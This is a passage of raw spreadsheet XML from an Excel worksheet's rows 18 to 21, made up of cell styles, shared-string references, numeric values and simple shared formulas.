      <c r="FB18" s="369"/>
      <c r="FC18" s="369" t="s">
        <v>12</v>
      </c>
      <c r="FD18" s="369">
        <f t="shared" si="2"/>
        <v>0</v>
      </c>
      <c r="FE18" s="369">
        <v>0</v>
      </c>
      <c r="FF18" s="369">
        <v>0</v>
      </c>
      <c r="FG18" s="369">
        <v>0</v>
      </c>
      <c r="FH18" s="370" t="s">
        <v>12</v>
      </c>
      <c r="FI18" s="377" t="str">
        <f t="shared" si="3"/>
        <v>NO</v>
      </c>
      <c r="FJ18" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FK18" s="378"/>
      <c r="FL18" s="378">
        <v>9999</v>
      </c>
      <c r="FM18" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FN18" s="378"/>
      <c r="FO18" s="378">
        <v>9999</v>
      </c>
      <c r="FP18" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FQ18" s="378"/>
      <c r="FR18" s="380" t="s">
        <v>12</v>
      </c>
      <c r="FS18" s="380"/>
      <c r="FT18" s="380"/>
      <c r="FU18" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FV18" s="378"/>
      <c r="FW18" s="378"/>
      <c r="FX18" s="378">
        <v>0</v>
      </c>
      <c r="FY18" s="378">
        <f t="shared" si="4"/>
        <v>0</v>
      </c>
      <c r="FZ18" s="378">
        <v>0</v>
      </c>
      <c r="GA18" s="378" t="s">
        <v>197</v>
      </c>
      <c r="GB18" s="378">
        <v>0</v>
      </c>
      <c r="GC18" s="379" t="s">
        <v>12</v>
      </c>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c r="IW18" s="40"/>
      <c r="IX18" s="40"/>
      <c r="IY18" s="40"/>
      <c r="IZ18" s="40"/>
      <c r="JA18" s="40"/>
      <c r="JB18" s="40"/>
      <c r="JC18" s="40"/>
      <c r="JD18" s="40"/>
      <c r="JE18" s="40"/>
      <c r="JF18" s="40"/>
      <c r="JG18" s="40"/>
      <c r="JH18" s="40"/>
      <c r="JI18" s="40"/>
      <c r="JJ18" s="40"/>
      <c r="JK18" s="40"/>
      <c r="JL18" s="40"/>
      <c r="JM18" s="40"/>
      <c r="JN18" s="40"/>
      <c r="JO18" s="40"/>
      <c r="JP18" s="40"/>
      <c r="JQ18" s="40"/>
      <c r="JR18" s="40"/>
      <c r="JS18" s="40"/>
      <c r="JT18" s="40"/>
      <c r="JU18" s="40"/>
      <c r="JV18" s="40"/>
      <c r="JW18" s="40"/>
      <c r="JX18" s="40"/>
      <c r="JY18" s="40"/>
      <c r="JZ18" s="40"/>
      <c r="KA18" s="40"/>
      <c r="KB18" s="40"/>
      <c r="KC18" s="40"/>
      <c r="KD18" s="40"/>
      <c r="KE18" s="40"/>
      <c r="KF18" s="40"/>
      <c r="KG18" s="40"/>
      <c r="KH18" s="40"/>
      <c r="KI18" s="40"/>
      <c r="KJ18" s="40"/>
      <c r="KK18" s="40"/>
      <c r="KL18" s="40"/>
      <c r="KM18" s="40"/>
      <c r="KN18" s="40"/>
      <c r="KO18" s="40"/>
      <c r="KP18" s="40"/>
      <c r="KQ18" s="40"/>
      <c r="KR18" s="40"/>
      <c r="KS18" s="40"/>
      <c r="KT18" s="40"/>
      <c r="KU18" s="40"/>
      <c r="KV18" s="40"/>
      <c r="KW18" s="40"/>
      <c r="KX18" s="40"/>
      <c r="KY18" s="40"/>
      <c r="KZ18" s="40"/>
      <c r="LA18" s="40"/>
      <c r="LB18" s="40"/>
      <c r="LC18" s="40"/>
      <c r="LD18" s="40"/>
      <c r="LE18" s="40"/>
      <c r="LF18" s="40"/>
      <c r="LG18" s="40"/>
      <c r="LH18" s="40"/>
      <c r="LI18" s="40"/>
    </row>
    <row r="19" spans="2:321" ht="39.950000000000003" customHeight="1">
      <c r="B19" s="224" t="s">
        <v>256</v>
      </c>
      <c r="C19" s="225" t="s">
        <v>12</v>
      </c>
      <c r="D19" s="225" t="s">
        <v>257</v>
      </c>
      <c r="E19" s="225" t="s">
        <v>433</v>
      </c>
      <c r="F19" s="225">
        <v>12</v>
      </c>
      <c r="G19" s="225" t="s">
        <v>434</v>
      </c>
      <c r="H19" s="225" t="s">
        <v>12</v>
      </c>
      <c r="I19" s="225"/>
      <c r="J19" s="225" t="s">
        <v>12</v>
      </c>
      <c r="K19" s="227" t="s">
        <v>435</v>
      </c>
      <c r="L19" s="228" t="s">
        <v>329</v>
      </c>
      <c r="M19" s="227" t="s">
        <v>436</v>
      </c>
      <c r="N19" s="227" t="s">
        <v>437</v>
      </c>
      <c r="O19" s="389" t="s">
        <v>2674</v>
      </c>
      <c r="P19" s="275" t="s">
        <v>191</v>
      </c>
      <c r="Q19" s="225" t="s">
        <v>191</v>
      </c>
      <c r="R19" s="225"/>
      <c r="S19" s="396"/>
      <c r="T19" s="280" t="s">
        <v>191</v>
      </c>
      <c r="U19" s="230" t="s">
        <v>195</v>
      </c>
      <c r="V19" s="231" t="s">
        <v>191</v>
      </c>
      <c r="W19" s="231"/>
      <c r="X19" s="232" t="s">
        <v>13</v>
      </c>
      <c r="Y19" s="255" t="s">
        <v>186</v>
      </c>
      <c r="Z19" s="256" t="s">
        <v>438</v>
      </c>
      <c r="AA19" s="257" t="s">
        <v>2411</v>
      </c>
      <c r="AB19" s="256" t="s">
        <v>2526</v>
      </c>
      <c r="AC19" s="226" t="s">
        <v>12</v>
      </c>
      <c r="AD19" s="258" t="s">
        <v>193</v>
      </c>
      <c r="AE19" s="259" t="s">
        <v>442</v>
      </c>
      <c r="AF19" s="270" t="s">
        <v>439</v>
      </c>
      <c r="AG19" s="225" t="s">
        <v>440</v>
      </c>
      <c r="AH19" s="271" t="s">
        <v>441</v>
      </c>
      <c r="AI19" s="280" t="s">
        <v>13</v>
      </c>
      <c r="AJ19" s="229" t="s">
        <v>192</v>
      </c>
      <c r="AK19" s="229" t="s">
        <v>13</v>
      </c>
      <c r="AL19" s="229" t="s">
        <v>192</v>
      </c>
      <c r="AM19" s="229" t="s">
        <v>192</v>
      </c>
      <c r="AN19" s="281" t="s">
        <v>192</v>
      </c>
      <c r="AO19" s="287" t="s">
        <v>13</v>
      </c>
      <c r="AP19" s="230"/>
      <c r="AQ19" s="230"/>
      <c r="AR19" s="288">
        <v>2</v>
      </c>
      <c r="AS19" s="288">
        <v>1</v>
      </c>
      <c r="AT19" s="288">
        <v>0</v>
      </c>
      <c r="AU19" s="288">
        <f t="shared" si="5"/>
        <v>1</v>
      </c>
      <c r="AV19" s="256" t="s">
        <v>12</v>
      </c>
      <c r="AW19" s="288">
        <v>5</v>
      </c>
      <c r="AX19" s="288">
        <v>5</v>
      </c>
      <c r="AY19" s="288">
        <v>0</v>
      </c>
      <c r="AZ19" s="288">
        <f t="shared" ref="AZ19:AZ40" si="14">AX19+AY19</f>
        <v>5</v>
      </c>
      <c r="BA19" s="289"/>
      <c r="BB19" s="301">
        <v>0</v>
      </c>
      <c r="BC19" s="302">
        <v>0</v>
      </c>
      <c r="BD19" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BE19" s="302">
        <v>0</v>
      </c>
      <c r="BF19" s="303" t="s">
        <v>13</v>
      </c>
      <c r="BG19" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BH19" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BI19" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BJ19" s="302" t="str">
        <f t="shared" si="6"/>
        <v>-, -</v>
      </c>
      <c r="BK19" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BL19" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BM19" s="302">
        <v>0</v>
      </c>
      <c r="BN19" s="304">
        <v>2</v>
      </c>
      <c r="BO19" s="304">
        <v>0</v>
      </c>
      <c r="BP19" s="304">
        <v>0</v>
      </c>
      <c r="BQ19" s="304">
        <v>0</v>
      </c>
      <c r="BR19" s="304">
        <f t="shared" si="7"/>
        <v>0</v>
      </c>
      <c r="BS19" s="304">
        <v>0</v>
      </c>
      <c r="BT19" s="304">
        <v>0</v>
      </c>
      <c r="BU19" s="304">
        <v>0</v>
      </c>
      <c r="BV19" s="305">
        <v>0</v>
      </c>
      <c r="BW19" s="317">
        <v>8</v>
      </c>
      <c r="BX19" s="318">
        <v>5</v>
      </c>
      <c r="BY19" s="318" t="s">
        <v>443</v>
      </c>
      <c r="BZ19" s="318">
        <v>4</v>
      </c>
      <c r="CA19" s="318" t="s">
        <v>13</v>
      </c>
      <c r="CB19" s="318" t="s">
        <v>444</v>
      </c>
      <c r="CC19" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CD19" s="318" t="s">
        <v>444</v>
      </c>
      <c r="CE19" s="318" t="str">
        <f t="shared" si="8"/>
        <v>2043217, -</v>
      </c>
      <c r="CF19" s="318">
        <v>2043217</v>
      </c>
      <c r="CG19" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CH19" s="318">
        <v>1</v>
      </c>
      <c r="CI19" s="319">
        <v>2</v>
      </c>
      <c r="CJ19" s="319">
        <v>2</v>
      </c>
      <c r="CK19" s="319">
        <v>1</v>
      </c>
      <c r="CL19" s="319">
        <v>0</v>
      </c>
      <c r="CM19" s="319">
        <f t="shared" si="9"/>
        <v>1</v>
      </c>
      <c r="CN19" s="319">
        <v>6</v>
      </c>
      <c r="CO19" s="319">
        <v>5</v>
      </c>
      <c r="CP19" s="319">
        <v>0</v>
      </c>
      <c r="CQ19" s="319">
        <v>8</v>
      </c>
      <c r="CR19" s="319">
        <v>8</v>
      </c>
      <c r="CS19" s="320">
        <v>5</v>
      </c>
      <c r="CT19" s="339">
        <v>10</v>
      </c>
      <c r="CU19" s="340">
        <v>5</v>
      </c>
      <c r="CV19" s="340" t="s">
        <v>445</v>
      </c>
      <c r="CW19" s="340">
        <v>5</v>
      </c>
      <c r="CX19" s="340"/>
      <c r="CY19" s="340" t="s">
        <v>446</v>
      </c>
      <c r="CZ19" s="340" t="s">
        <v>12</v>
      </c>
      <c r="DA19" s="340" t="s">
        <v>446</v>
      </c>
      <c r="DB19" s="340" t="str">
        <f t="shared" si="10"/>
        <v>2043217, -</v>
      </c>
      <c r="DC19" s="340">
        <v>2043217</v>
      </c>
      <c r="DD19" s="340" t="s">
        <v>12</v>
      </c>
      <c r="DE19" s="340">
        <v>1</v>
      </c>
      <c r="DF19" s="341">
        <v>2</v>
      </c>
      <c r="DG19" s="341">
        <v>2</v>
      </c>
      <c r="DH19" s="341">
        <v>1</v>
      </c>
      <c r="DI19" s="341">
        <v>0</v>
      </c>
      <c r="DJ19" s="341">
        <f t="shared" si="11"/>
        <v>1</v>
      </c>
      <c r="DK19" s="341">
        <v>8</v>
      </c>
      <c r="DL19" s="341">
        <v>5</v>
      </c>
      <c r="DM19" s="341">
        <v>4</v>
      </c>
      <c r="DN19" s="341">
        <v>8</v>
      </c>
      <c r="DO19" s="341">
        <v>12</v>
      </c>
      <c r="DP19" s="342">
        <v>5</v>
      </c>
      <c r="DQ19" s="355">
        <v>21</v>
      </c>
      <c r="DR19" s="356">
        <v>5</v>
      </c>
      <c r="DS19" s="356" t="s">
        <v>447</v>
      </c>
      <c r="DT19" s="356">
        <v>9</v>
      </c>
      <c r="DU19" s="356"/>
      <c r="DV19" s="356" t="s">
        <v>448</v>
      </c>
      <c r="DW19" s="356" t="s">
        <v>12</v>
      </c>
      <c r="DX19" s="356" t="s">
        <v>448</v>
      </c>
      <c r="DY19" s="356" t="str">
        <f t="shared" si="12"/>
        <v>2043217, -</v>
      </c>
      <c r="DZ19" s="356">
        <v>2043217</v>
      </c>
      <c r="EA19" s="356" t="s">
        <v>12</v>
      </c>
      <c r="EB19" s="356">
        <v>1</v>
      </c>
      <c r="EC19" s="357">
        <v>2</v>
      </c>
      <c r="ED19" s="357">
        <v>2</v>
      </c>
      <c r="EE19" s="357">
        <v>1</v>
      </c>
      <c r="EF19" s="357">
        <v>0</v>
      </c>
      <c r="EG19" s="357">
        <f t="shared" si="13"/>
        <v>1</v>
      </c>
      <c r="EH19" s="357">
        <v>15</v>
      </c>
      <c r="EI19" s="357">
        <v>5</v>
      </c>
      <c r="EJ19" s="357">
        <v>4</v>
      </c>
      <c r="EK19" s="357">
        <v>19</v>
      </c>
      <c r="EL19" s="357">
        <v>23</v>
      </c>
      <c r="EM19" s="358">
        <v>5</v>
      </c>
      <c r="EN19" s="368" t="str">
        <f t="shared" si="1"/>
        <v>SI</v>
      </c>
      <c r="EO19" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EP19" s="369"/>
      <c r="EQ19" s="369" t="s">
        <v>12</v>
      </c>
      <c r="ER19" s="369" t="s">
        <v>12</v>
      </c>
      <c r="ES19" s="369" t="s">
        <v>13</v>
      </c>
      <c r="ET19" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EU19" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EV19" s="369"/>
      <c r="EW19" s="369">
        <v>18123</v>
      </c>
      <c r="EX19" s="369"/>
      <c r="EY19" s="369" t="s">
        <v>13</v>
      </c>
      <c r="EZ19" s="369" t="s">
        <v>12</v>
      </c>
      <c r="FA19" s="369"/>
      <c r="FB19" s="369"/>
      <c r="FC19" s="369">
        <v>1</v>
      </c>
      <c r="FD19" s="369">
        <f t="shared" si="2"/>
        <v>1</v>
      </c>
      <c r="FE19" s="369">
        <v>0</v>
      </c>
      <c r="FF19" s="369">
        <v>1</v>
      </c>
      <c r="FG19" s="369">
        <v>1</v>
      </c>
      <c r="FH19" s="370" t="s">
        <v>449</v>
      </c>
      <c r="FI19" s="377" t="str">
        <f t="shared" si="3"/>
        <v>SI</v>
      </c>
      <c r="FJ19" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FK19" s="378"/>
      <c r="FL19" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FM19" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FN19" s="378"/>
      <c r="FO19" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FP19" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FQ19" s="378"/>
      <c r="FR19" s="380" t="s">
        <v>450</v>
      </c>
      <c r="FS19" s="380"/>
      <c r="FT19" s="380"/>
      <c r="FU19" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FV19" s="378"/>
      <c r="FW19" s="378"/>
      <c r="FX19" s="378">
        <v>1</v>
      </c>
      <c r="FY19" s="378">
        <f t="shared" si="4"/>
        <v>0</v>
      </c>
      <c r="FZ19" s="378">
        <v>0</v>
      </c>
      <c r="GA19" s="378" t="s">
        <v>197</v>
      </c>
      <c r="GB19" s="378">
        <v>0</v>
      </c>
      <c r="GC19" s="379" t="s">
        <v>12</v>
      </c>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c r="IW19" s="40"/>
      <c r="IX19" s="40"/>
      <c r="IY19" s="40"/>
      <c r="IZ19" s="40"/>
      <c r="JA19" s="40"/>
      <c r="JB19" s="40"/>
      <c r="JC19" s="40"/>
      <c r="JD19" s="40"/>
      <c r="JE19" s="40"/>
      <c r="JF19" s="40"/>
      <c r="JG19" s="40"/>
      <c r="JH19" s="40"/>
      <c r="JI19" s="40"/>
      <c r="JJ19" s="40"/>
      <c r="JK19" s="40"/>
      <c r="JL19" s="40"/>
      <c r="JM19" s="40"/>
      <c r="JN19" s="40"/>
      <c r="JO19" s="40"/>
      <c r="JP19" s="40"/>
      <c r="JQ19" s="40"/>
      <c r="JR19" s="40"/>
      <c r="JS19" s="40"/>
      <c r="JT19" s="40"/>
      <c r="JU19" s="40"/>
      <c r="JV19" s="40"/>
      <c r="JW19" s="40"/>
      <c r="JX19" s="40"/>
      <c r="JY19" s="40"/>
      <c r="JZ19" s="40"/>
      <c r="KA19" s="40"/>
      <c r="KB19" s="40"/>
      <c r="KC19" s="40"/>
      <c r="KD19" s="40"/>
      <c r="KE19" s="40"/>
      <c r="KF19" s="40"/>
      <c r="KG19" s="40"/>
      <c r="KH19" s="40"/>
      <c r="KI19" s="40"/>
      <c r="KJ19" s="40"/>
      <c r="KK19" s="40"/>
      <c r="KL19" s="40"/>
      <c r="KM19" s="40"/>
      <c r="KN19" s="40"/>
      <c r="KO19" s="40"/>
      <c r="KP19" s="40"/>
      <c r="KQ19" s="40"/>
      <c r="KR19" s="40"/>
      <c r="KS19" s="40"/>
      <c r="KT19" s="40"/>
      <c r="KU19" s="40"/>
      <c r="KV19" s="40"/>
      <c r="KW19" s="40"/>
      <c r="KX19" s="40"/>
      <c r="KY19" s="40"/>
      <c r="KZ19" s="40"/>
      <c r="LA19" s="40"/>
      <c r="LB19" s="40"/>
      <c r="LC19" s="40"/>
      <c r="LD19" s="40"/>
      <c r="LE19" s="40"/>
      <c r="LF19" s="40"/>
      <c r="LG19" s="40"/>
      <c r="LH19" s="40"/>
      <c r="LI19" s="40"/>
    </row>
    <row r="20" spans="2:321" ht="39.950000000000003" customHeight="1">
      <c r="B20" s="224" t="s">
        <v>273</v>
      </c>
      <c r="C20" s="225" t="s">
        <v>12</v>
      </c>
      <c r="D20" s="225" t="s">
        <v>274</v>
      </c>
      <c r="E20" s="225" t="s">
        <v>451</v>
      </c>
      <c r="F20" s="225">
        <v>13</v>
      </c>
      <c r="G20" s="225" t="s">
        <v>452</v>
      </c>
      <c r="H20" s="225" t="s">
        <v>12</v>
      </c>
      <c r="I20" s="225"/>
      <c r="J20" s="225" t="s">
        <v>12</v>
      </c>
      <c r="K20" s="227" t="s">
        <v>453</v>
      </c>
      <c r="L20" s="228" t="s">
        <v>12</v>
      </c>
      <c r="M20" s="227" t="s">
        <v>454</v>
      </c>
      <c r="N20" s="227" t="s">
        <v>455</v>
      </c>
      <c r="O20" s="389" t="s">
        <v>2675</v>
      </c>
      <c r="P20" s="275" t="s">
        <v>191</v>
      </c>
      <c r="Q20" s="225" t="s">
        <v>191</v>
      </c>
      <c r="R20" s="225"/>
      <c r="S20" s="396"/>
      <c r="T20" s="280" t="s">
        <v>191</v>
      </c>
      <c r="U20" s="230" t="s">
        <v>195</v>
      </c>
      <c r="V20" s="231" t="s">
        <v>191</v>
      </c>
      <c r="W20" s="231"/>
      <c r="X20" s="232" t="s">
        <v>192</v>
      </c>
      <c r="Y20" s="255" t="s">
        <v>352</v>
      </c>
      <c r="Z20" s="256" t="s">
        <v>457</v>
      </c>
      <c r="AA20" s="257" t="s">
        <v>2413</v>
      </c>
      <c r="AB20" s="256" t="s">
        <v>2417</v>
      </c>
      <c r="AC20" s="226" t="s">
        <v>12</v>
      </c>
      <c r="AD20" s="258" t="s">
        <v>193</v>
      </c>
      <c r="AE20" s="259" t="s">
        <v>460</v>
      </c>
      <c r="AF20" s="270" t="s">
        <v>458</v>
      </c>
      <c r="AG20" s="225" t="s">
        <v>459</v>
      </c>
      <c r="AH20" s="271" t="s">
        <v>458</v>
      </c>
      <c r="AI20" s="280" t="s">
        <v>13</v>
      </c>
      <c r="AJ20" s="229" t="s">
        <v>192</v>
      </c>
      <c r="AK20" s="229" t="s">
        <v>13</v>
      </c>
      <c r="AL20" s="229" t="s">
        <v>192</v>
      </c>
      <c r="AM20" s="229" t="s">
        <v>13</v>
      </c>
      <c r="AN20" s="281" t="s">
        <v>192</v>
      </c>
      <c r="AO20" s="287" t="s">
        <v>13</v>
      </c>
      <c r="AP20" s="230"/>
      <c r="AQ20" s="230"/>
      <c r="AR20" s="288">
        <v>5</v>
      </c>
      <c r="AS20" s="288">
        <v>1</v>
      </c>
      <c r="AT20" s="288">
        <v>1</v>
      </c>
      <c r="AU20" s="288">
        <f t="shared" si="5"/>
        <v>2</v>
      </c>
      <c r="AV20" s="256" t="s">
        <v>456</v>
      </c>
      <c r="AW20" s="288">
        <v>1</v>
      </c>
      <c r="AX20" s="288">
        <v>1</v>
      </c>
      <c r="AY20" s="288">
        <v>1</v>
      </c>
      <c r="AZ20" s="288">
        <f t="shared" si="14"/>
        <v>2</v>
      </c>
      <c r="BA20" s="289" t="s">
        <v>465</v>
      </c>
      <c r="BB20" s="301">
        <v>0</v>
      </c>
      <c r="BC20" s="302">
        <v>0</v>
      </c>
      <c r="BD20" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BE20" s="302">
        <v>0</v>
      </c>
      <c r="BF20" s="303" t="s">
        <v>13</v>
      </c>
      <c r="BG20" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BH20" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BI20" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BJ20" s="302" t="str">
        <f t="shared" si="6"/>
        <v>-, -</v>
      </c>
      <c r="BK20" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BL20" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BM20" s="302">
        <v>0</v>
      </c>
      <c r="BN20" s="304">
        <v>4</v>
      </c>
      <c r="BO20" s="304">
        <v>0</v>
      </c>
      <c r="BP20" s="304">
        <v>0</v>
      </c>
      <c r="BQ20" s="304">
        <v>0</v>
      </c>
      <c r="BR20" s="304">
        <f t="shared" si="7"/>
        <v>0</v>
      </c>
      <c r="BS20" s="304">
        <v>0</v>
      </c>
      <c r="BT20" s="304">
        <v>0</v>
      </c>
      <c r="BU20" s="304">
        <v>0</v>
      </c>
      <c r="BV20" s="305">
        <v>0</v>
      </c>
      <c r="BW20" s="317">
        <v>4</v>
      </c>
      <c r="BX20" s="318">
        <v>0</v>
      </c>
      <c r="BY20" s="318" t="s">
        <v>461</v>
      </c>
      <c r="BZ20" s="318">
        <v>2</v>
      </c>
      <c r="CA20" s="318" t="s">
        <v>13</v>
      </c>
      <c r="CB20" s="318" t="s">
        <v>461</v>
      </c>
      <c r="CC20" s="318" t="s">
        <v>461</v>
      </c>
      <c r="CD20" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CE20" s="318" t="str">
        <f t="shared" si="8"/>
        <v>-, -</v>
      </c>
      <c r="CF20" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CG20" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CH20" s="318">
        <v>0</v>
      </c>
      <c r="CI20" s="319">
        <v>3</v>
      </c>
      <c r="CJ20" s="319">
        <v>2</v>
      </c>
      <c r="CK20" s="319">
        <v>0</v>
      </c>
      <c r="CL20" s="319">
        <v>0</v>
      </c>
      <c r="CM20" s="319">
        <f t="shared" si="9"/>
        <v>0</v>
      </c>
      <c r="CN20" s="319">
        <v>4</v>
      </c>
      <c r="CO20" s="319">
        <v>0</v>
      </c>
      <c r="CP20" s="319">
        <v>0</v>
      </c>
      <c r="CQ20" s="319">
        <v>4</v>
      </c>
      <c r="CR20" s="319">
        <v>4</v>
      </c>
      <c r="CS20" s="320">
        <v>0</v>
      </c>
      <c r="CT20" s="339">
        <v>7</v>
      </c>
      <c r="CU20" s="340">
        <v>0</v>
      </c>
      <c r="CV20" s="340" t="s">
        <v>462</v>
      </c>
      <c r="CW20" s="340">
        <v>3</v>
      </c>
      <c r="CX20" s="340"/>
      <c r="CY20" s="340" t="s">
        <v>462</v>
      </c>
      <c r="CZ20" s="340" t="s">
        <v>462</v>
      </c>
      <c r="DA20" s="340" t="s">
        <v>12</v>
      </c>
      <c r="DB20" s="340" t="str">
        <f t="shared" si="10"/>
        <v>-, -</v>
      </c>
      <c r="DC20" s="340" t="s">
        <v>12</v>
      </c>
      <c r="DD20" s="340" t="s">
        <v>12</v>
      </c>
      <c r="DE20" s="340">
        <v>0</v>
      </c>
      <c r="DF20" s="341">
        <v>4</v>
      </c>
      <c r="DG20" s="341">
        <v>3</v>
      </c>
      <c r="DH20" s="341">
        <v>0</v>
      </c>
      <c r="DI20" s="341">
        <v>0</v>
      </c>
      <c r="DJ20" s="341">
        <f t="shared" si="11"/>
        <v>0</v>
      </c>
      <c r="DK20" s="341">
        <v>7</v>
      </c>
      <c r="DL20" s="341">
        <v>0</v>
      </c>
      <c r="DM20" s="341">
        <v>3</v>
      </c>
      <c r="DN20" s="341">
        <v>4</v>
      </c>
      <c r="DO20" s="341">
        <v>7</v>
      </c>
      <c r="DP20" s="342">
        <v>0</v>
      </c>
      <c r="DQ20" s="355">
        <v>82</v>
      </c>
      <c r="DR20" s="356">
        <v>0</v>
      </c>
      <c r="DS20" s="356" t="s">
        <v>463</v>
      </c>
      <c r="DT20" s="356">
        <v>6</v>
      </c>
      <c r="DU20" s="356"/>
      <c r="DV20" s="356" t="s">
        <v>463</v>
      </c>
      <c r="DW20" s="356" t="s">
        <v>464</v>
      </c>
      <c r="DX20" s="356" t="s">
        <v>371</v>
      </c>
      <c r="DY20" s="356" t="str">
        <f t="shared" si="12"/>
        <v>-, -</v>
      </c>
      <c r="DZ20" s="356" t="s">
        <v>12</v>
      </c>
      <c r="EA20" s="356" t="s">
        <v>12</v>
      </c>
      <c r="EB20" s="356">
        <v>0</v>
      </c>
      <c r="EC20" s="357">
        <v>3</v>
      </c>
      <c r="ED20" s="357">
        <v>3</v>
      </c>
      <c r="EE20" s="357">
        <v>0</v>
      </c>
      <c r="EF20" s="357">
        <v>0</v>
      </c>
      <c r="EG20" s="357">
        <f t="shared" si="13"/>
        <v>0</v>
      </c>
      <c r="EH20" s="357">
        <v>56</v>
      </c>
      <c r="EI20" s="357">
        <v>0</v>
      </c>
      <c r="EJ20" s="357">
        <v>3</v>
      </c>
      <c r="EK20" s="357">
        <v>79</v>
      </c>
      <c r="EL20" s="357">
        <v>82</v>
      </c>
      <c r="EM20" s="358">
        <v>0</v>
      </c>
      <c r="EN20" s="368" t="str">
        <f t="shared" si="1"/>
        <v>SI</v>
      </c>
      <c r="EO20" s="369">
        <v>9</v>
      </c>
      <c r="EP20" s="369"/>
      <c r="EQ20" s="369">
        <v>12449</v>
      </c>
      <c r="ER20" s="369">
        <v>1</v>
      </c>
      <c r="ES20" s="369" t="s">
        <v>13</v>
      </c>
      <c r="ET20" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EU20" s="369">
        <v>12449</v>
      </c>
      <c r="EV20" s="369"/>
      <c r="EW20" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EX20" s="369"/>
      <c r="EY20" s="369" t="s">
        <v>13</v>
      </c>
      <c r="EZ20" s="369" t="s">
        <v>12</v>
      </c>
      <c r="FA20" s="369"/>
      <c r="FB20" s="369"/>
      <c r="FC20" s="369">
        <v>1</v>
      </c>
      <c r="FD20" s="369">
        <f t="shared" si="2"/>
        <v>0</v>
      </c>
      <c r="FE20" s="369">
        <v>0</v>
      </c>
      <c r="FF20" s="369">
        <v>0</v>
      </c>
      <c r="FG20" s="369">
        <v>1</v>
      </c>
      <c r="FH20" s="370" t="s">
        <v>466</v>
      </c>
      <c r="FI20" s="377" t="str">
        <f t="shared" si="3"/>
        <v>SI</v>
      </c>
      <c r="FJ20" s="378">
        <v>2</v>
      </c>
      <c r="FK20" s="378"/>
      <c r="FL20" s="381">
        <v>33515</v>
      </c>
      <c r="FM20" s="378">
        <v>1</v>
      </c>
      <c r="FN20" s="378"/>
      <c r="FO20" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FP20" s="378">
        <v>33515</v>
      </c>
      <c r="FQ20" s="378"/>
      <c r="FR20" s="380" t="s">
        <v>12</v>
      </c>
      <c r="FS20" s="380"/>
      <c r="FT20" s="380"/>
      <c r="FU20" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FV20" s="378"/>
      <c r="FW20" s="378"/>
      <c r="FX20" s="378">
        <v>1</v>
      </c>
      <c r="FY20" s="378">
        <f t="shared" si="4"/>
        <v>0</v>
      </c>
      <c r="FZ20" s="378">
        <v>0</v>
      </c>
      <c r="GA20" s="378" t="s">
        <v>197</v>
      </c>
      <c r="GB20" s="378">
        <v>2</v>
      </c>
      <c r="GC20" s="379" t="s">
        <v>467</v>
      </c>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c r="JA20" s="40"/>
      <c r="JB20" s="40"/>
      <c r="JC20" s="40"/>
      <c r="JD20" s="40"/>
      <c r="JE20" s="40"/>
      <c r="JF20" s="40"/>
      <c r="JG20" s="40"/>
      <c r="JH20" s="40"/>
      <c r="JI20" s="40"/>
      <c r="JJ20" s="40"/>
      <c r="JK20" s="40"/>
      <c r="JL20" s="40"/>
      <c r="JM20" s="40"/>
      <c r="JN20" s="40"/>
      <c r="JO20" s="40"/>
      <c r="JP20" s="40"/>
      <c r="JQ20" s="40"/>
      <c r="JR20" s="40"/>
      <c r="JS20" s="40"/>
      <c r="JT20" s="40"/>
      <c r="JU20" s="40"/>
      <c r="JV20" s="40"/>
      <c r="JW20" s="40"/>
      <c r="JX20" s="40"/>
      <c r="JY20" s="40"/>
      <c r="JZ20" s="40"/>
      <c r="KA20" s="40"/>
      <c r="KB20" s="40"/>
      <c r="KC20" s="40"/>
      <c r="KD20" s="40"/>
      <c r="KE20" s="40"/>
      <c r="KF20" s="40"/>
      <c r="KG20" s="40"/>
      <c r="KH20" s="40"/>
      <c r="KI20" s="40"/>
      <c r="KJ20" s="40"/>
      <c r="KK20" s="40"/>
      <c r="KL20" s="40"/>
      <c r="KM20" s="40"/>
      <c r="KN20" s="40"/>
      <c r="KO20" s="40"/>
      <c r="KP20" s="40"/>
      <c r="KQ20" s="40"/>
      <c r="KR20" s="40"/>
      <c r="KS20" s="40"/>
      <c r="KT20" s="40"/>
      <c r="KU20" s="40"/>
      <c r="KV20" s="40"/>
      <c r="KW20" s="40"/>
      <c r="KX20" s="40"/>
      <c r="KY20" s="40"/>
      <c r="KZ20" s="40"/>
      <c r="LA20" s="40"/>
      <c r="LB20" s="40"/>
      <c r="LC20" s="40"/>
      <c r="LD20" s="40"/>
      <c r="LE20" s="40"/>
      <c r="LF20" s="40"/>
      <c r="LG20" s="40"/>
      <c r="LH20" s="40"/>
      <c r="LI20" s="40"/>
    </row>
    <row r="21" spans="2:321" ht="39.950000000000003" customHeight="1">
      <c r="B21" s="224" t="s">
        <v>273</v>
      </c>
      <c r="C21" s="225" t="s">
        <v>12</v>
      </c>
      <c r="D21" s="225" t="s">
        <v>274</v>
      </c>
